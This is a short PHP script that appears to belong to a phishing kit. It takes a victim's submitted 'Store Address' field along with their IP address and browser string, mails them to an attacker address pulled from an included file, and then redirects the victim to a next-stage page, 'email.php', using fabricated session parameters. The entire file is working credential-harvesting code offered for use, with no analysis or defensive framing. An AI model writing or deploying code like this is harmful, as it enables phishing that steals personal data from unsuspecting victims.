<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$_SERVER = getenv("HTTP_USER_AGENT");
$msg = "
-----------NEW STORE----------------->
Store Address : ".$_POST['sub']."

IP : $ip
Browser : $_SERVER
==================================";

include 'to.php';
$subj = "Login From Mr $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");

header('location: email.php?sessionDataKey=5e6c0340-6287-488a-8dfc-93bf6d11141a&state=983a3692-1ef3-4f0a-84b6-ea44e907fce5');
?>